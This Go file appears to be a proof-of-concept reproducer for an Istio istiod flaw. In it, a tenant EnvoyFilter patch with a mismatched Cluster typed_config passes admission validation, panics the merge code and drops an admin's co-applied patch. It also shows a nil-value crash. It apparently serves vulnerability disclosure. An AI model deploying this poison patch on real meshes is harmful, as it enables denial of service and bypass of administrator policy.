// Standalone runnable reproducer for the EnvoyFilter merge descriptor-mismatch
// panic and related refutations. Exercises the REAL exported istiod functions.
//
//	go run ./.zeroday/scratch/envoyfilter/standalone_repro.go
//
// It intentionally uses only EXPORTED symbols so it can live outside the package.
// The in-package test (zz_zeroday_repro_test.go, kept alongside) additionally
// drives the internal unrecovered path patchListeners() and the real PushContext
// scoping selection.
package main

import (
	"fmt"

	listener "github.com/envoyproxy/go-control-plane/envoy/config/listener/v3"
	hcm "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/network/http_connection_manager/v3"
	router "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/http/router/v3"

	networking "istio.io/api/networking/v1alpha3"
	"istio.io/istio/pilot/pkg/model"
	"istio.io/istio/pilot/pkg/networking/core/envoyfilter"
	nutil "istio.io/istio/pilot/pkg/networking/util"
	"istio.io/istio/pilot/pkg/util/protoconv"
	"istio.io/istio/pkg/config"
	"istio.io/istio/pkg/config/schema/gvk"
	valef "istio.io/istio/pkg/config/validation/envoyfilter"
	"istio.io/istio/pkg/config/xds"
	"istio.io/istio/pkg/util/protomarshal"
	"istio.io/istio/pkg/wellknown"

	structpb "google.golang.org/protobuf/types/known/structpb"
)

func patchStruct(j string) *structpb.Struct {
	v := &structpb.Struct{}
	if err := protomarshal.UnmarshalString(j, v); err != nil {
		panic(err)
	}
	return v
}

// The tenant-controlled patch.value: a network filter whose typed_config is a
// Cluster (type A) which will be merged into a real HttpConnectionManager (type B).
const mismatchJSON = `{
  "name": "envoy.filters.network.http_connection_manager",
  "typed_config": {
    "@type": "type.googleapis.com/envoy.config.cluster.v3.Cluster",
    "name": "attacker-cluster"
  }
}`

func main() {
	// ---- (1) crash primitive: the real MergeAnyWithAny on mismatched Any types ----
	hcmAny := protoconv.MessageToAny(&hcm.HttpConnectionManager{StatPrefix: "x"})
	fv, err := xds.BuildXDSObjectFromStruct(networking.EnvoyFilter_NETWORK_FILTER, patchStruct(mismatchJSON), false)
	if err != nil {
		panic("build failed: " + err.Error())
	}
	clusterAny := fv.(*listener.Filter).GetTypedConfig()
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[1] RAW PANIC in util.MergeAnyWithAny (istiod crash primitive): %v\n", r)
			}
		}()
		_, _ = nutil.MergeAnyWithAny(hcmAny, clusterAny)
		fmt.Println("[1] NO PANIC — unexpected")
	}()

	// ---- (2) prove it passes ValidateEnvoyFilter (admission accepts it) ----
	ef := &networking.EnvoyFilter{ConfigPatches: []*networking.EnvoyFilter_EnvoyConfigObjectPatch{{
		ApplyTo: networking.EnvoyFilter_NETWORK_FILTER,
		Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{
			Context: networking.EnvoyFilter_ANY,
			ObjectTypes: &networking.EnvoyFilter_EnvoyConfigObjectMatch_Listener{Listener: &networking.EnvoyFilter_ListenerMatch{
				FilterChain: &networking.EnvoyFilter_ListenerMatch_FilterChainMatch{
					Filter: &networking.EnvoyFilter_ListenerMatch_FilterMatch{Name: wellknown.HTTPConnectionManager},
				},
			}},
		},
		Patch: &networking.EnvoyFilter_Patch{Operation: networking.EnvoyFilter_Patch_MERGE, Value: patchStruct(mismatchJSON)},
	}}}
	_, verr := valef.ValidateEnvoyFilter(config.Config{
		Meta: config.Meta{Name: "tenant-ef", Namespace: "tenant-ns", GroupVersionKind: gvk.EnvoyFilter},
		Spec: ef,
	})
	fmt.Printf("[2] ValidateEnvoyFilter error = %v  (nil => admission ACCEPTS the poison patch)\n", verr)

	// ---- (3) recovered ApplyListenerPatches DROPS a co-applied (admin/root-ns) patch ----
	tenant := &model.EnvoyFilterConfigPatchWrapper{
		FullName: "tenant-ns/tenant-ef", ApplyTo: networking.EnvoyFilter_NETWORK_FILTER,
		Operation: networking.EnvoyFilter_Patch_MERGE, Value: fv,
		Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{
			Context: networking.EnvoyFilter_ANY,
			ObjectTypes: &networking.EnvoyFilter_EnvoyConfigObjectMatch_Listener{Listener: &networking.EnvoyFilter_ListenerMatch{
				FilterChain: &networking.EnvoyFilter_ListenerMatch_FilterChainMatch{
					Filter: &networking.EnvoyFilter_ListenerMatch_FilterMatch{Name: wellknown.HTTPConnectionManager},
				},
			}},
		},
	}
	admin := &model.EnvoyFilterConfigPatchWrapper{
		FullName: "istio-system/admin-ef", ApplyTo: networking.EnvoyFilter_HTTP_FILTER,
		Operation: networking.EnvoyFilter_Patch_ADD,
		Value:     &hcm.HttpFilter{Name: "admin.injected.marker", ConfigType: &hcm.HttpFilter_TypedConfig{TypedConfig: protoconv.MessageToAny(&router.Router{})}},
		Match:     &networking.EnvoyFilter_EnvoyConfigObjectMatch{Context: networking.EnvoyFilter_ANY},
	}
	efw := &model.MergedEnvoyFilterWrapper{Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
		networking.EnvoyFilter_HTTP_FILTER:    {admin},
		networking.EnvoyFilter_NETWORK_FILTER: {tenant},
	}}
	out := envoyfilter.ApplyListenerPatches(networking.EnvoyFilter_SIDECAR_INBOUND, efw, []*listener.Listener{buildHTTPListener()}, false)
	fmt.Printf("[3] admin marker present after recovery = %v  (false => admin/root-ns patch was DROPPED by the tenant-induced panic)\n", adminMarkerPresent(out[0]))

	// control: admin patch alone applies
	efw2 := &model.MergedEnvoyFilterWrapper{Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
		networking.EnvoyFilter_HTTP_FILTER: {admin},
	}}
	out2 := envoyfilter.ApplyListenerPatches(networking.EnvoyFilter_SIDECAR_INBOUND, efw2, []*listener.Listener{buildHTTPListener()}, false)
	fmt.Printf("[3] control: admin marker present WITHOUT tenant patch = %v  (true => drop is caused by the tenant patch)\n", adminMarkerPresent(out2[0]))

	// ---- (4) unrecovered InsertedClusters nil-deref (validation-gated) ----
	efwNil := &model.MergedEnvoyFilterWrapper{Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
		networking.EnvoyFilter_CLUSTER: {{
			FullName: "tenant-ns/nil", ApplyTo: networking.EnvoyFilter_CLUSTER,
			Operation: networking.EnvoyFilter_Patch_ADD, Value: nil,
			Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{Context: networking.EnvoyFilter_SIDECAR_OUTBOUND},
		}},
	}}
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[4] UNRECOVERED panic in InsertedClusters on nil value: %v  (requires validation disabled)\n", r)
			}
		}()
		_ = envoyfilter.InsertedClusters(networking.EnvoyFilter_SIDECAR_OUTBOUND, efwNil)
		fmt.Println("[4] NO PANIC — unexpected")
	}()
}

func buildHTTPListener() *listener.Listener {
	hcmAny := protoconv.MessageToAny(&hcm.HttpConnectionManager{
		StatPrefix:  "inbound",
		HttpFilters: []*hcm.HttpFilter{{Name: "envoy.filters.http.router", ConfigType: &hcm.HttpFilter_TypedConfig{TypedConfig: protoconv.MessageToAny(&router.Router{})}}},
	})
	return &listener.Listener{
		Name: "virtualInbound",
		FilterChains: []*listener.FilterChain{{Name: "fc0", Filters: []*listener.Filter{
			{Name: wellknown.HTTPConnectionManager, ConfigType: &listener.Filter_TypedConfig{TypedConfig: hcmAny}},
		}}},
	}
}

func adminMarkerPresent(l *listener.Listener) bool {
	hc := &hcm.HttpConnectionManager{}
	if err := l.FilterChains[0].Filters[0].GetTypedConfig().UnmarshalTo(hc); err != nil {
		return false
	}
	for _, f := range hc.HttpFilters {
		if f.Name == "admin.injected.marker" {
			return true
		}
	}
	return false
}
